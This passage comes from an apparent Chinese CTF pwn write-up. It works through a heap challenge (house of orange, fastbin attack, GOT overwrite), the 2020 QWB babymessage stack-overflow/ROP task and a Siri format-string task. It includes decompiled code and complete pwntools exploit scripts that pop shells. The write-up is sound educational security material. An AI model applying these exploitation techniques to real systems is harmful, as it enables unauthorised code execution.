+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;nofree&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">&#x27;./nofree&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;101.200.53.148&#x27;</span>, <span class="number">12301</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.27-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xe1</span>))<span class="comment">#修改top chunk的size，注意对齐内存页</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x81</span>))<span class="comment">#house of orange</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602140</span>))<span class="comment">#fastbin attack:fd-&gt;0x602140</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x81</span>))<span class="comment">#addr:0x602140</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x602068</span>)+p64(<span class="number">0x90</span>))<span class="comment">#修改idx0的指针为strdup的got表</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400700</span>))<span class="comment">#改为printf</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;%17$p&#x27;</span>)<span class="comment">#fmtstr</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line"><span class="comment">#0x20840</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x70</span>+p64(elf.got[<span class="string">&#x27;strdup&#x27;</span>])+p64(<span class="number">0x90</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>onegaget应该也可以没试过，太晚了歇了歇了…</p>
+<p><em><strong>Reference：</strong></em></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/#_1">house of orange</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-222718.htm">堆溢出-House of orange 学习笔记</a></p>
+<h1 id="0x04-2020强网杯-babymessage"><a href="#0x04-2020强网杯-babymessage" class="headerlink" title="0x04 2020强网杯 babymessage"></a>0x04 2020强网杯 babymessage</h1><p>说到这题，比赛一百多解，但始终卡在一个点，题目除了NX外，无其他保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  v1 = mm + <span class="number">16</span>;<span class="comment">//可读入的长度，由mm决定</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">          __isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;mm)<span class="comment">//mm即option，存入内存</span></span><br><span class="line">          <span class="keyword">if</span> ( mm != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          leave_name();<span class="comment">//输入名字，存到0x6010D0位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( mm != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">256</span> )</span><br><span class="line">          v1 = <span class="number">256</span>;<span class="comment">//长度</span></span><br><span class="line">        leave_message(v1);<span class="comment">//输入信息，堆块指针存入0x6010C8处</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( mm != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show(v1);<span class="comment">//打印</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( mm == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;<span class="comment">//退出</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个姓名，信息和打印功能的程序，类似堆题但没有堆的可利用点<br>简单看一下option，buf，name在内存的分布</p>
+<p><img src="https://i.loli.net/2020/08/27/hfIc5FgyqswpevZ.png" alt="image-20200827005910158"></p>
+<p>找啊找，程序似乎写的很好，没什么利用<br>但是依旧存在一个小bug</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">leave_message</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST14_4</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;message: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, &amp;v3, a1);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, v1);</span><br><span class="line">  buf[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入leave_message函数，发现v3在rbp-8h的位置，可读入初始长度为16，存在栈溢出；<br>但溢出距离太短，只够覆盖rbp，以至于栈迁移都不够。<br>可是想一想，a1是可读入长度，若想增加长度必然要改option，而option在内存中的位置很安全，没有函数可以修改到它，且函数限定了option只能为1，2，3，4，并不能改到很大的值，因此这条路是走不通的显然这题只能覆盖rbp，但是把改到哪是一个问题，比赛时我就被卡到这个死胡同了，实在想不通便去做Siri了<br>那本题的关键在哪呢？在这</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &gt; 256 )</span><br><span class="line">	v1 = 256;</span><br><span class="line">leave_message(v1);</span><br></pre></td></tr></table></figure>
+
+<p>程序在执行leave_message之前，先判断了一次v1的大小(mm+16)，如果大于256，则把它赋值为256<br>如果程序有了判断条件，那么一定存在与v1相关的指令，虽然我很不想，但是必须采取终极解决方案了——看汇编</p>
+<p><img src="https://i.loli.net/2020/08/27/Hah95gr6A8m73tW.png"></p>
+<p>所以覆盖rbp，使得rbp-4的值我们可控即可，这就是本题最核心的点。<br>改到哪呢，name我们可写，将rbp改到它高4个字节处，使得name&gt;256，接下面就是简单的ROP了</p>
+<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;123.56.170.202&#x27;,21342)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babymessage&#x27;</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">work_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x400ac3</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span>+ p64(<span class="number">0x6010D4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,p32(<span class="number">0xf000050</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;message:&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload_2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload_2 += p64(<span class="number">0x6010D4</span>)</span><br><span class="line">payload_2 += p64(rdi_ret)</span><br><span class="line">payload_2 += p64(puts_got)</span><br><span class="line">payload_2 += p64(puts_plt)</span><br><span class="line">payload_2 += p64(work_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message:&#x27;</span>,payload_2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr- libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,p32(<span class="number">0xf000050</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;message:&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4f365</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;message:&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可惜啊可惜，感觉这题应该是可以做的</p>
+<h1 id="0x05-2020-强网杯-Siri"><a href="#0x05-2020-强网杯-Siri" class="headerlink" title="0x05 2020 强网杯 Siri"></a>0x05 2020 强网杯 Siri</h1><p>这题考点是格式化字符串漏洞，本以为难点是计算偏移，没想到比赛时我卡在了这样一个奇怪的地方，又没做出来。。原因是数太大了，无法使用fmtstr_payload写地址</p>
+<p><img src="https://i.loli.net/2020/08/28/Nd3jmAKI8S45pTZ.png"></p>
+<p>先看题，打开main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+100h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_11C5();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">while</span> ( read(<span class="number">0</span>, &amp;s1, <span class="number">0x100</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;Hey Siri!&quot;</span>, <span class="number">9uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt; What Can I do for you?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="string">&quot;Hey Siri!&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;s1, <span class="number">0x100</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1326(&amp;s1) &amp;&amp; !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_12E4(&amp;s1) &amp;&amp; !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1212(&amp;s1) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt; Sorry, I can&#x27;t understand.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s1, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题保护全开，关键函数在这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_1212</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+18h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">strstr</span>(a1, <span class="string">&quot;Remind me to &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x110</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;&gt;&gt;&gt; OK, I&#x27;ll remind you to %s&quot;</span>, v2 + <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它是将<code>Remind me to </code>后的字符放在s[rbp-120h]处，然后一个格式化字符串漏洞，只有这一个利用点</p>
+<p>我的思路是泄露libc_start函数和栈的地址，从而泄露出libc基址，然后将返回地址改为one_gadget</p>
+<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><p>这是我比赛时的exp，由于pwntools的fmt_payload没法用，我又在github上找了一个脚本FmtPayload<br>但是还是失败了，我感觉思路应该没问题。。费解，<br>网上到现在还没有出强网杯pwn部分的wp，就先放着，等之后出了wp再回头解决</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> FmtPayload</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Siri&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./Siri&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;114.116.54.89&#x27;,10005)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;Remind me to %46$pAAAA%83$p&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;you?&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">sh.recvuntil(<span class="string">&quot;to &quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack:&#x27;</span> + <span class="built_in">hex</span>(stack)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">libc_start240 = <span class="built_in">int</span>(sh.recv(<span class="number">16</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_start240:&#x27;</span> + <span class="built_in">hex</span>(libc_start240)</span><br><span class="line">libc_base = libc_start240 - <span class="number">240</span> -libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a45c</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">tar = stack - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(tar)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;you?&#x27;</span>)</span><br><span class="line">payload2 = FmtPayload.fmt_payload(<span class="number">10</span>,tar,one_gadget,n=<span class="number">3</span>,written=<span class="number">30</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,typex=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2 = fmtstr_payload(10,&#123;stack-0x118:one_gadget&#125;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;Remind me to &#x27;</span>+payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>后续：题目已解出，exp搞丢了，就不重写了，不放了</p>
+<hr>
+<h1 id="0x06-DASCTF-八月赛-magic-number"><a href="#0x06-DASCTF-八月赛-magic-number" class="headerlink" title="0x06 DASCTF 八月赛 magic_number"></a>0x06 DASCTF 八月赛 magic_number</h1><p>一道100分的题没整出来，吐了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0();</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x12345678</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
